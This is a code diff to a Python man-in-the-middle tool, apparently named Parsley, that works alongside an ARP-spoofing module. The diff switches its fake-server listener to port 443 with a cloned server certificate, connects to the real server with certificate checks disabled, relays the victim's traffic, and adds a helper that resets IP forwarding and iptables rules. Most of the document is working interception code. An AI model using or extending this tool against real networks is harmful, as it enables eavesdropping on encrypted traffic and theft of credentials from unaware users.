@@ -11,6 +11,7 @@ import netifaces as ni
 import threading
 import traceback
 import ssl
+import time
 
 from argparse import ArgumentParser
 
@@ -32,9 +33,8 @@ import arp_spoof
 
 KEYFILE = 'server_key.pem'
 CERTFILE = 'server_cert.pem'
-
-
-import time
+PORT = 443
+CONN = 5
 
 version = 0.01
 banner="""\n
@@ -44,8 +44,8 @@ banner="""\n
 |  __/ (_| | |  \__ \ |  __/ |_| |
 |_|   \__,_|_|  |___/_|\___|\__, |
                             |___/ 
-
-"""
+	Parsley v{}\n
+by:Dan00bie\n\n""".format(version)
 
 # parse command line
 def set_configs():
@@ -91,11 +91,17 @@ def set_configs():
 	print(conf)
 	return conf
 
+def end( configs ):
+	print ( "[*] Disabling ip forwarding..." )
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+	print ( "[*] Cleaning iptables rules..." )
+	iptables_clean()
 
 def start( configs ):
+	time.sleep(0.1)
 	try:
 		print ( banner )
-		print ( version )
+		#print ( version )
 		# print ( "Ensure that ARP spoofing is running!" )
 		
 		print ( "[*] Enabling ip forwarding..." )
@@ -113,24 +119,24 @@ def start( configs ):
 		print ( "[*] Cloning server certificate..." )
 		cert = get_cert_from_endpoint ( configs['server']['ip'] )
 		#cert = _get_cert_from_endpoint ( "www.google.com" )
-		clone_certificate ( cert )
+		if ( cert != None ): clone_certificate ( cert )
 
 		spoof_server( configs )
 		# spoof_gateway( configs )
 		
+		end( configs )
+
 	except KeyboardInterrupt:
 		#print ("\n[!] Ctrl+C: closing program")
 		#s.close()
 		#f.close()
-		iptables_clean()
-		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		end( configs )
 		raise
 		
 	except Exception as e:# Any other error
 		print ("\n[!] Error in executing program:" )
 		print(traceback.format_exc())
-		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-		iptables_clean()
+		end( configs )
 
 		# the socket is open? If yes close it
 		
@@ -139,28 +145,36 @@ def spoof_server ( configs ):
 		# socket for the mitm, it will fake server and listen for client connections
 		s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
 
-		s.bind((configs['mitm']['ip'],80))
-		s.listen(5)
+		s.bind((configs['mitm']['ip'],PORT))
+		
 		# ssl_version=ssl.PROTOCOL_SSLv23 ssl.PROTOCOL_TLS
-		#sslsocket = ssl.wrap_socket ( s, server_side = True, keyfile=KEYFILE, certfile=CERTFILE, do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )
+		if ( PORT == 443 ):
+			s = ssl.wrap_socket ( s, server_side = True, keyfile=KEYFILE, certfile=CERTFILE, do_handshake_on_connect=True, ssl_version=ssl.PROTOCOL_SSLv23 )
+			s.listen(CONN)
+		else:
+			s.listen(CONN)
 
-		print ("[*] Listening on port 80..")
+		print ("[*] Listening on port %d.." % PORT)
 		
 		while True:
 			try:
 				# server socket, it opens a communication with real server
 				f = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-				#wrap_f = ssl.wrap_socket ( f, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )
-
+				
 				print("[*] Connecting to server...")
-				#wrap_f.connect(( configs['server']['ip'], 443)) # connecting using 202 source IP
-				f.connect (( configs['server']['ip'], 80))
+				if ( PORT == 443 ):
+					print("[*] Doing TLS handshake...")
+					f = ssl.wrap_socket ( f, server_side=False, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE )
+					f.connect(( configs['server']['ip'], PORT)) # connecting using 202 source IP
+				else:
+					f.connect (( configs['server']['ip'], PORT))
 				print("[*] Connection enstablished!")
 
 
 				#c, addr = s.accept()
 				# https://issues.apache.org/jira/browse/THRIFT-4274
 				#c, addr = sslsocket.accept()
+				c = None
 				c, addr = s.accept()
 
 				# ok i have a connection with victim client on secure socket c
@@ -199,8 +213,7 @@ def spoof_server ( configs ):
 					#print ( e )
 					print ("Socket error({0}): {1}".format(e.errno, e.strerror))
 					print ( os.strerror( e.errno ) )
-					iptables_clean()
-					os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+					end( configs )
 					#s.close() # do i need to close wrapped one?
 					c.shutdown( SHUT_RDWR )
 					c.close()
@@ -213,7 +226,7 @@ def spoof_server ( configs ):
 				#f.shutdown( SHUT_RDWR )
 				f.close()
 				#c.shutdown( SHUT_RDWR )
-				c.close()
+				if ( c != None ): c.close()
 				raise
 	# disabled promiscuous mode
 	# s.ioctl(s.SIO_RCVALL, s.RCVALL_OFF)
@@ -229,8 +242,7 @@ def spoof_server ( configs ):
 		#print ( "errno no: ", v[0] ) # ERROR IN THE ERROR python3
 		print(traceback.format_exc())
 		# print(sys.exc_info()[0]) #ERROR sys not defined
-		iptables_clean()
-		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		end( configs )
 
 def gateway_forward ( configs ):
 	def sniff( packet ):
@@ -270,20 +282,3 @@ def main():
 
 if __name__ == '__main__' :
 	main()
-
-'''
-TODO / PROBLEMS:
-import in ogni file
-server che non esistono con certificati che non esistono
-errno 104 exception handling nella connessione per connection reset by peer
-il formatting di output fa schifo
-come fa recv a capire che i dati sono finiti senza un EOD? Dovrebbe rimanere in attesa fino a un timeout ma poi non ritorna i dati
-parsing protocolli application e diversi tipi di output
-rendere il progetto piu modulare
-implementare la parte UDP
-gestire piu connessioni per piu client e piu threads
-spoofare il gateway --> significa cambiare un be di roba
-gestire porte in ascolto su mitm e servizi da emulare
-flush e basta di iptables all'uscita non va bene solo la regola aggiunta e da eliminare
-i parametri per la connessione tls dovrebbero essere personalizzabili o dinamici
-'''
